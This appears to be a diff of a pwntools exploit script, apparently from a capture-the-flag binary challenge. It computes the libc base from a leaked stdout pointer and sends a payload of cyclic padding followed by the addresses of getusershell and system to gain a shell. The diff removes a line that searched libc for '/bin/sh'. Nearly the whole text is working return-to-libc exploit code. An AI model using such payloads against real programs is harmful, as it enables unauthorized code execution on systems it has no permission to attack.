@@ -19,7 +19,6 @@ else:
 if __name__ == "__main__":
     libc.address = int(io.recvline(), 16) - libc.sym['_IO_2_1_stdout_']
     success("libc -> {:#x}".format(libc.address))
-    binsh = next(libc.search("/bin/sh\0"))
 
     payload = flat(cyclic(0x20), libc.sym['getusershell'], libc.sym['system'])
     io.sendline(payload)
